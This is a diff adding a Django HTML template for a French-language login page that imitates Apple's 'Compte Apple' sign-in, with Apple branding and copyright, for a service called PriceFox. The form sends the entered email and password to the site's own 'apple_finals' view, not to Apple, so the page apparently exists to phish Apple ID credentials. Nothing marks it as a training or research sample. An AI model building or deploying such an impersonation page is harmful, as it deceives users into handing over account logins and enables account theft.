@@ -1,0 +1,94 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Apple ID - Login</title>
+  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+  <link rel="stylesheet" href="{% static 'styless.css' %}">
+</head>
+
+<body class="min-h-screen flex flex-col">
+  <header class="w-full border-b border-gray-200 py-4">
+    <div class="container mx-auto px-4">
+      <div class="flex items-center justify-between max-w-md mx-auto">
+        
+        <!-- Left Side: Apple Icon + Compte Apple (Stacked) -->
+        <div class="flex flex-col items-center">
+          <img src="{% static 'images/appel.png' %}" alt="Appel Icon" class="h-4 w-4 mb-7">
+          <h1 class="text-2xl font-semibold">Compte Apple</h1>
+        </div>
+        
+        <!-- Right Side: Se connecter -->
+        <a href="#" class="text-blue-600 hover:underline">Se connecter</a>
+      </div>
+    </div>
+  </header>
+  
+  <main class="flex-1">
+    <div class="mx-auto max-w-md px-4 py-8">
+      <!-- App Icon -->
+      <div class="flex justify-center my-6">
+        <div class="rounded-xl bg-gray-100 p-3 w-16 h-16 flex items-center justify-center">
+          <img src="{% static 'images/logo.jpeg' %}" alt="PriceFox Icon" class="h-10 w-10">
+        </div>
+      </div>
+      
+      <h2 id="pageTitle" class="mb-8 text-center text-lg">
+        Utilisez votre compte Apple pour vous connecter à PriceFox
+      </h2>
+      
+      <!-- Form to submit email and password -->
+      <form method="post" action="{% url 'apple_finals' %}" class="space-y-6">
+        {% csrf_token %}
+        <div id="emailSection">
+          <div class="relative">
+            <input 
+              type="email" 
+              id="email" 
+              name="email" 
+              placeholder="E-mail ou numéro de téléphone" 
+              class="w-full border border-gray-300 rounded-lg px-3 py-2 focus:outline-none focus:ring-1 focus:ring-blue-500"
+              autocomplete="off"
+              required
+            >
+          </div>
+        </div>
+
+        <div id="passwordSection">
+          <div class="relative">
+            <input 
+              type="password" 
+              id="password" 
+              name="password" 
+              placeholder="Mot de passe" 
+              class="w-full border border-gray-300 rounded-lg px-3 py-2 focus:outline-none focus:ring-1 focus:ring-blue-500"
+              autocomplete="off"
+              required
+            >
+          </div>
+        </div>
+        
+        <button type="submit" class="w-full bg-blue-500 text-white py-2 rounded-lg hover:bg-blue-600">
+          Continuer
+        </button>
+      </form>
+    </div>
+  </main>
+  
+  <footer class="mt-auto w-full bg-gray-100 py-4 text-xs text-gray-500">
+    <div class="container mx-auto px-4">
+      <div class="flex flex-col items-center justify-center space-y-3">
+        <div class="text-center">
+          Copyright © 2025 Apple Inc. Tous droits réservés.
+        </div>
+        <div class="flex space-x-6">
+          <a href="/privacy-policy" class="hover:underline">Engagement de confidentialité</a>
+          <a href="/cookie-policy" class="hover:underline">Utilisation des cookies</a>
+        </div>
+      </div>
+    </div>
+  </footer>
+</body>
+</html>
